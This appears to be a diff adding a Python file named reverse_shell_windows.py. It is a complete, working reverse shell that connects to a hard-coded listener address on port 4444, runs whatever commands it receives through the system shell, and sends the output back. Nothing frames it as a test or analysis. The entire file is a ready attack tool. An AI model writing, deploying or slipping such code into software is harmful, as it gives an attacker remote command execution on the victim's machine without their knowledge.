@@ -1,0 +1,22 @@
+# reverse_shell_windows.py
+import socket
+import subprocess
+
+IP = '192.168.17.203'
+PORT = 4444
+
+s = socket.socket()
+s.connect((IP, PORT))
+
+while True:
+    command = s.recv(1024).decode('utf-8')
+    if command.lower() in ['exit', 'quit']:
+        break
+
+    try:
+        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+    except Exception as e:
+        result = str(e).encode()
+
+    s.send(result)
+s.close()
